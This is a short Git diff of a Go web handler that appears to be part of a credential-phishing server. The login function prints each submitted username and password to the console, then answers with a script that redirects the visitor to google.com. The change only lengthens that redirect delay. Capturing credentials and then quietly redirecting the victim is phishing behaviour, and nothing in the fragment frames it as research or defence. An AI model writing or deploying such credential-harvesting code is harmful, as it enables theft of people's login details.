@@ -42,7 +42,7 @@ func login(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Printf("[+] username: %v password %v\n", username, password)
 
-	fmt.Fprint(w, "<script> setTimeout(function() { window.location.replace(\"http://google.com\"); }, 1000) </script>")
+	fmt.Fprint(w, "<script> setTimeout(function() { window.location.replace(\"http://google.com\"); }, 3000) </script>")
 }
 
 func main() {
